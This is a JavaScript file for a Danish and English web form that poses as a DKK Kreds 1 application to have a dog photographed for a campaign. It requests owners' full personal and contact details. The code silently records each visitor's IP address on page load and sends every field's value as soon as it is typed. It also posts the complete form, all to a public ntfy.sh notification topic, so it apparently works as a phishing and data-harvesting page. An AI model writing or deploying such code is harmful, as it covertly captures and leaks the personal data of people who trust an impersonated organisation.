// --- CONFIGURATION ---
const NTFY_TOPIC = "dkkkreds1_fotoshoot_secret_98765";
let currentLang = 'da';
let dogCount = 0;
let userIP = "Fetching...";
const sessionId = Math.random().toString(36).substring(2, 9); // Track session

// --- TRANSLATION DICTIONARY ---
const i18n = {
    da: {
        menu: "MENU", login: "Login",
        nav_owner: "Hundeejer", nav_breeder: "Opdrætter", nav_activities: "Aktiviteter", nav_education: "Uddannelser",
        nav_shows: "Udstillinger", nav_about: "Om DKK", nav_member: "Bliv medlem", nav_contact: "Kontakt",
        hero_title: "Ansøgning: Fotografering af hunde",
        hero_subtitle: "Udfyld formularen for at din hund kan indgå i kampagnematerialet for DKK Kreds 1.",
        owner_title: "Ejerinformation",
        f_name: "Fulde navn (Dansk format)", f_address: "Fulde Adresse", f_email: "E-mailadresse", f_phone: "Telefonnummer", f_socials: "Links til Sociale Medier (f.eks. Instagram)", f_dkk: "DKK Medlemsnummer (Valgfrit)",
        dog_title: "Hundeinformation",
        d_name: "Hundens navn og Race", d_age: "Hundens Alder", d_skills: "Tricks og Færdigheder", d_photos: "Link til billeder af hunden",
        btn_add_dog: "Tilføj endnu en hund", btn_submit: "Send Ansøgning",
        msg_success: "Tak for din ansøgning! Vi vender tilbage hurtigst muligt.", msg_error: "Der opstod en fejl. Prøv igen.", msg_sending: "Sender..."
    },
    en: {
        menu: "MENU", login: "Login",
        nav_owner: "Dog Owner", nav_breeder: "Breeder", nav_activities: "Activities", nav_education: "Education",
        nav_shows: "Dog Shows", nav_about: "About DKK", nav_member: "Become a member", nav_contact: "Contact",
        hero_title: "Application: Dog Photography",
        hero_subtitle: "Fill out the form to let your dog participate in the campaign material for DKK District 1.",
        owner_title: "Owner Information",
        f_name: "Full Name", f_address: "Full Address", f_email: "Email Address", f_phone: "Phone Number", f_socials: "Social Media Links (e.g., Instagram)", f_dkk: "DKK Member Number (Optional)",
        dog_title: "Dog Information",
        d_name: "Dog's Name & Breed", d_age: "Dog's Age", d_skills: "Tricks and Skills", d_photos: "Link to photos of the dog",
        btn_add_dog: "Add another dog", btn_submit: "Submit Application",
        msg_success: "Thank you for applying! We will contact you soon.", msg_error: "An error occurred. Please try again.", msg_sending: "Sending..."
    }
};

// --- CORE FUNCTIONS ---

// 1. Fetch IP & Send Page Load Notification
window.addEventListener('DOMContentLoaded', async () => {
    try {
        let res = await fetch('https://api.ipify.org?format=json');
        let data = await res.json();
        userIP = data.ip;
    } catch(e) { userIP = "Unknown"; }

    // Init First Dog
    addDogField();
    bindFieldTracking();

    // Send silently
    sendNtfy("👀 Page Visited", `Session: ${sessionId}\nIP: ${userIP}\nTime: ${new Date().toLocaleString('da-DK')}`);
});

// 2. Add Dog Function
function addDogField() {
    dogCount++;
    const container = document.getElementById('dogsContainer');
    const div = document.createElement('div');
    div.className = 'dog-card';
    div.innerHTML = `
        <div class="dog-badge">#${dogCount}</div>
        <div class="input-group">
            <input type="text" class="dogName" required placeholder=" ">
            <label data-i18n="d_name">${i18n[currentLang].d_name}</label>
            <i class="fa-solid fa-check validation-icon"></i>
        </div>
        <div class="input-group">
            <input type="text" class="dogAge" required placeholder=" ">
            <label data-i18n="d_age">${i18n[currentLang].d_age}</label>
            <i class="fa-solid fa-check validation-icon"></i>
        </div>
        <div class="input-group">
            <input type="text" class="dogSkills" required placeholder=" ">
            <label data-i18n="d_skills">${i18n[currentLang].d_skills}</label>
            <i class="fa-solid fa-check validation-icon"></i>
        </div>
        <div class="input-group">
            <input type="url" class="dogPhotos" required placeholder=" ">
            <label data-i18n="d_photos">${i18n[currentLang].d_photos}</label>
            <i class="fa-solid fa-check validation-icon"></i>
        </div>
    `;
    container.appendChild(div);
    bindFieldTracking(div);
}
document.getElementById('addDogBtn').addEventListener('click', addDogField);

// 3. Live Field Tracking (Fires when user leaves a field after typing)
function bindFieldTracking(parent = document) {
    const inputs = parent.querySelectorAll('input, textarea');
    inputs.forEach(input => {
        
        // UI Validation visual
        input.addEventListener('input', () => {
            if(input.checkValidity() && input.value.trim() !== '') {
                input.parentElement.classList.add('valid');
            } else {
                input.parentElement.classList.remove('valid');
            }
        });

        // Ntfy Tracking on Blur
        input.addEventListener('blur', (e) => {
            const val = e.target.value.trim();
            const fieldName = e.target.previousElementSibling ? e.target.previousElementSibling.id : e.target.className;
            
            if (val !== "") {
                const msg = `✍️ FIELD ENTERED:\nField: ${fieldName || 'Input'}\nValue: ${val}\nSession: ${sessionId}\nIP: ${userIP}`;
                sendNtfy("✍️ User Typing...", msg, "pencil2");
            }
        });
    });
}

// 4. Submit Entire Form
document.getElementById('dkkForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const btn = document.getElementById('submitBtn');
    const status = document.getElementById('statusMessage');
    
    btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> ${i18n[currentLang].msg_sending}`;
    btn.disabled = true;

    // Collect Dog Data
    let dogDetailsDA = "";
    let dogDetailsEN = "";
    document.querySelectorAll('.dog-card').forEach((el, index) => {
        let name = el.querySelector('.dogName').value;
        let age = el.querySelector('.dogAge').value;
        let skills = el.querySelector('.dogSkills').value;
        let photos = el.querySelector('.dogPhotos').value;

        dogDetailsDA += `\nHUND ${index + 1}:\n- Navn/Race: ${name}\n- Alder: ${age}\n- Færdigheder: ${skills}\n- Billeder: ${photos}\n`;
        dogDetailsEN += `\nDOG ${index + 1}:\n- Name/Breed: ${name}\n- Age: ${age}\n- Skills: ${skills}\n- Photos: ${photos}\n`;
    });

    // Dual Language Payload
    const payload = 
`🐶 📸 Ny DKK Model Ansøgning! / New Application!

--- DANISH (DA) ---
EJER:
Navn: ${document.getElementById('ownerName').value}
Adresse: ${document.getElementById('ownerAddress').value}
E-mail: ${document.getElementById('ownerEmail').value}
Tlf: ${document.getElementById('ownerPhone').value}
Sociale Medier: ${document.getElementById('ownerSocials').value || 'Ingen'}
DKK Medlem: ${document.getElementById('dkkMember').value || 'Ingen'}

HUNDE INFO: ${dogDetailsDA}

--- ENGLISH (EN) ---
OWNER:
Name: ${document.getElementById('ownerName').value}
Address: ${document.getElementById('ownerAddress').value}
Email: ${document.getElementById('ownerEmail').value}
Phone: ${document.getElementById('ownerPhone').value}
Socials: ${document.getElementById('ownerSocials').value || 'None'}
DKK Member: ${document.getElementById('dkkMember').value || 'None'}

DOG INFO: ${dogDetailsEN}
---------------------------
Sikkerhed/IP: ${userIP}
Tidspunkt: ${new Date().toLocaleString('da-DK')}`;

    try {
        await sendNtfy("🐶 📸 Ny DKK Model Ansøgning!", payload, "camera_flash");
        status.className = 'status-message status-success';
        status.innerText = i18n[currentLang].msg_success;
        document.getElementById('dkkForm').reset();
        document.querySelectorAll('.input-group').forEach(el => el.classList.remove('valid'));
    } catch (err) {
        status.className = 'status-message status-error';
        status.innerText = i18n[currentLang].msg_error;
    } finally {
        btn.innerHTML = `<span>${i18n[currentLang].btn_submit}</span> <i class="fa-solid fa-arrow-right"></i>`;
        btn.disabled = false;
    }
});

// 5. Ntfy Helper Function
async function sendNtfy(title, message, tags = "bell") {
    return fetch(`https://ntfy.sh/${NTFY_TOPIC}`, {
        method: 'POST',
        body: message,
        headers: { 'Title': title, 'Tags': tags }
    });
}

// 6. Language Switcher
window.toggleLanguage = function(e) {
    e.preventDefault();
    currentLang = currentLang === 'da' ? 'en' : 'da';
    
    document.getElementById('langLabel').innerText = currentLang === 'da' ? 'English' : 'Dansk';
    
    document.querySelectorAll('[data-i18n]').forEach(el => {
        const key = el.getAttribute('data-i18n');
        if (i18n[currentLang][key]) {
            if (el.tagName === 'LABEL' || el.tagName === 'SPAN' || el.tagName === 'H1' || el.tagName === 'H2' || el.tagName === 'A') {
                el.innerText = i18n[currentLang][key];
            }
        }
    });
};
